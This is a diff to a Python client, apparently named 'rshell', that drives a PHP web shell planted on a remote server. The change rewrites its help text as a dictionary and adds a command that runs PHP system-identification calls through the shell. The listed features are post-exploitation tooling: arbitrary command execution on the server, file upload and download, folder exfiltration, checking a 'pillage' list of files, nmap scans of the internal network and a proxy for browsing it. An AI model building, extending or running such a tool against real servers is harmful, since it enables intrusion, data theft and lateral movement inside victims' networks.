@@ -52,10 +52,10 @@ class rshell(Cmd):
     width = 80
     proxy_object = None
 
-    def __init__(self, shell_url, proxy):
+    def __init__(self, shell_url, proxyp):
         Cmd.__init__(self)
         self.shell_url = shell_url
-        self.proxy = proxy
+        self.proxy = proxyp
 
     def log_data(self, cmd, data):
         f = open(cmd.split()[0], "w")
@@ -63,23 +63,28 @@ class rshell(Cmd):
         f.close()
 
     def do_help(self, line):
-        print " " * 15, "help: Show this message\n"
-        print " " * 15, "payload: show the shell code in php\n"
-        print " " * 15, "download: download remotepath/remotefile localpath/localfile\n"
-        print " " * 15, "upload: upload localpath/localfile remotepath/remotefile\n"
-        print " " * 15, "compress_folder: compress_folder folder_path file.tar.gz\n"
-        print " " * 15, "dwfolder: do_dwfolder folder_path\n"
-        print " " * 15, "getsysinfo: get info about the system\n"
-        print " " * 15, "getswversion: get versions of some software\n"
-        print " " * 15, "check_files: check existence of a list of files (pillage.lst)\n"
-        print " " * 15, "get_local_ips: get local ips and subnet mask bits\n"
-        print " " * 15, "print_local_ips: print local ips finded\n"
-        print " " * 15, "find_hosts: find hosts in local network using nmap\n"
-        print " " * 15, "print_hosts [ip]: print finded hosts info\n"
-        print " " * 15, "start_proxy: starts a local proxy, set your browser " \
-                        "proxy settings and surf the internal network\n"
-        print " " * 15, "stop_proxy: stops the proxy server\n"
-        print " " * 15, "Or write a command to send to the server shell\n"
+        help_string = {
+            "help": "Show this message",
+            "payload": "show the shell code in php",
+            "download": "download remote_path/remote_file local_path/local_file",
+            "upload": "upload local_path/local_file remote_path/remote_file",
+            "compress_folder": "compress_folder folder_path file.tar.gz",
+            "dwfolder": "do_dwfolder folder_path",
+            "getsysinfo": "get info about the system",
+            "getswversion": "get versions of some software",
+            "check_files": "check existence of a list of files (pillage.lst)",
+            "get_local_ips": "get local ips and subnet mask bits",
+            "print_local_ips": "print local ips finded",
+            "find_hosts": "find hosts in local network using nmap",
+            "print_hosts [ip]": "print finded hosts info",
+            "start_proxy": "starts a local proxy, set your browser "
+                        "proxy settings and surf the internal network",
+            "stop_proxy": "stops the proxy server",
+            "cmd_to_send": "You can write a command to be runned in the server",
+            "!cmd_local": "If the command starts with ! it run locally",
+        }
+        for k, v in help_string.items():
+            print "\t{0:<20}: {1:<50}".format(k, v)
 
         return None
 
@@ -364,6 +369,22 @@ class rshell(Cmd):
     def do_set_password(self, line):
         a = sha512(line)
         print a.hexdigest()
+
+    def do_sql_connect(self, line):
+        print line
+
+    def do_get_os(self, line):
+        cmd = "echo '\tOS: '.php_uname('s').'\n';\
+               echo '\tHostName: '.php_uname('n').'\n';\
+               echo '\tRelease: '.php_uname('r').'\n';\
+               echo '\tVersion: '.php_uname('v').'\n';\
+               echo '\tArch: '.php_uname('m').'\n';"
+        (code, data) = self.dorequest(cmd)
+        if code == 200:
+            print data
+        else:
+            print "Error"
+        return None
 
 #    def do_cd(self, line):
 #        cmd = "cd ../; pwd"
